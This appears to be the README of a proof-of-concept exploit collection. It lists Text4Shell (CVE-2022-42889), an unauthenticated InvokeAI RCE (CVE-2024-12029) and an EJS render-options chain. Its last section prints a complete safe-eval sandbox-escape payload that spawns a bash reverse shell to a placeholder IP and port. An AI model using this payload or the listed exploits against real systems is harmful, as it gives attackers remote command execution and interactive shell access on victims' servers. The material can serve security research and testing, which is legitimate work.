# PoCs

## CVE 2022-42889
Text4Shell RCE Python3 version

## CVE 2024-12029
Unauth RCE in InvokeAI. The vulnerability was discovered by @jackfromeast. Here is a Python3 version

## Node JS
### EJS v3.1.9 (valid from EJS v2.6.2 to v3.1.9)
[Chain of Unrestricted Render Options](https://github.com/apostolovd/PoCs/blob/main/EJS/Chain%20of%20Unrestricted%20Render%20Options.pdf)

### safe-eval bypass
It works with valuesOf(), toLocaleString(), propertyIsEnumerable.call()
> (function() {try{valueOf()} catch(rce){rce.constructor.constructor('return process')().mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'`); }})()
